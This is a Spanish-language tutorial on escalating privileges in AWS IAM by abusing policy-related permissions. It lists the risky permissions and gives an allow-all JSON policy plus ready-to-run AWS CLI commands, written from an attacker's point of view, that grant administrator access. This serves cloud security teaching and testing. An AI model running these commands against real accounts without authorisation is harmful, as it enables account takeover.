# Intro

Las políticas son el mecanismo principal por el cual se otorgan o restringen permisos en AWS. Aunque los usuarios pueden ser asignados directamente a grupos o roles, son las políticas adjuntas a estos grupos y roles las que determinan efectivamente los accesos permitidos. Esto significa que un control inadecuado sobre quién puede crear o modificar políticas puede abrir la puerta a cambios no autorizados que amplíen los permisos más allá de lo necesario o seguro.

# Permisos críticos sobre políticas

| Permiso | Descripción |
|----|----|
|iam:CreatePolicyVersion | Permite a un usuario crear nuevas versiones de una política agregando a la misma derechos excesivos|
|iam:SetDefaultPolicyVersion | Habilita a los usuarios a cambiar la versión por defecto de una política. Un atacante podría revertir una política a una versión anterior con permisos más amplios |
|iam:AttachUserPolicy | Permite adjuntar políticas a usuarios de manera directa, logrando así conseguir acceso no autorizado a recursos críticos |
|iam:AttachGroupPolicy | Permite asignar políticas a un grupo permitiendo así ampliar los permisos a los miembros del grupo |
|iam:AttachRolePolicy | Permite adjuntar políticas a roles |
|iam:PutUserPolicy, iam:PutGroupPolicy, iam:PutRolePolicy | Permiten la inserción de políticas en línea directamente en usuarios, grupos y roles, respectivamente. Estos permisos permiten la modificación directa de los permisos asignados, facilitando la escalada de privilegios. |

## iam:CreatePolicyVersion

Si el usuario que dominamos tiene este privilegio, podemos crear una nueva política que nos permita usar cualquier accion sobre cualquier recurso, asignarla como nueva versión de una política sobre la que tenemos poder y defaultearla teniendo así todos los privilegios de un admin.

#### Política nueva

    {
      "Version": "2012-10-17",
      "Statement": [
        {
          "Sid": "PermitirTodo",
          "Effect": "Allow",
          "Action": "*",
          "Resource": "*"
        }
      ]
    }

#### Asignación de política

    aws iam create-policy-version --policy-arn <arn_politica_victima> --policy-document file://admin_politica.json --set-as-default --profile <perfil_atacante>

## iam:SetDefaultPolicyVersion

Los usuarios con el permiso iam:SetDefaultPolicyVersion pueden establecer qué versión de la política es la versión por default. Si tenemos estos permisos sobre una política en cuyas versiones anteriores se encuentre una mala configuración que permita abusos, podemos aprovecharla para volver esa versión como default.

Una vez que encontramos la versión que nos brinde más privilegios podemos setearla como versión por default:

    aws iam set-default-policy-version --policy-arn <arn_politica> --version-id <versión_a_defaultear> --profile <perfil_atacante>

## iam:AttachUserPolicy

Un atacante con el permiso iam:AttachUserPolicy puede aumentar los privilegios adjuntando una política a un usuario al que tiene acceso, agregando los permisos de esa política al atacante. Podemos entonces adjuntarnos las políticas de administrador a nuestro usuario:

    aws iam attach-user-policy --user-name <user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile <perfil_atacante>

## iam:AttachGroupPolicy
Un atacante con el permiso puede aumentar los privilegios adjuntando una política a un grupo del que forma parte, agregando los permisos de esa política al atacante. En este caso, simplemente necesitamos adjuntar la política de administrador a un grupo al que pertenecemos o al que podemos llegar:

    aws iam attach-group-policy --group-name <grupo> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile <perfil_atacante>

## iam:AttachRolePolicy

Un atacante con el permiso puede aumentar los privilegios adjuntando una política a una función a la que tiene acceso, agregando los permisos de esa política al atacante. En este caso podemos adjuntar las políticas de administrador a un rol que poseemos o al que podemos acceder mediante otro user.

    aws iam attach-role-policy --role-name <rol> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile <perfil_atacante>


## iam:PutUserPolicy, PutGroupPolicy, PutRolePolicy
Un atacante con el permiso puede aumentar los privilegios creando o actualizando una política en línea para un usuario, grupo o rol al que tiene acceso, agregando los permisos de esa política al atacante.

En este caso, creamos una nueva política con todos los privilegios:

    {
      "Version": "2012-10-17",
      "Statement": [
        {
          "Sid": "PermitirTodo",
          "Effect": "Allow",
          "Action": "*",
          "Resource": "*"
        }
      ]
    }

#### adjuntar a user:

    aws iam put-user-policy --user-name <user> --policy-name politica-PrivEsc --policy-document file://admin_politica.json --profile <perfil_atacante>

#### Adjuntar a grupo:

    aws iam put-group-policy --group-name <group> --policy-name politica-PrivEsc --policy-document file://admin_politica.json --profile <perfil_atacante>

#### Adjuntar a rol

    aws iam put-role-policy --role-name <rol> --policy-name politica-PrivEsc --policy-document file://admin_politica.json --profile <perfil_atacante>
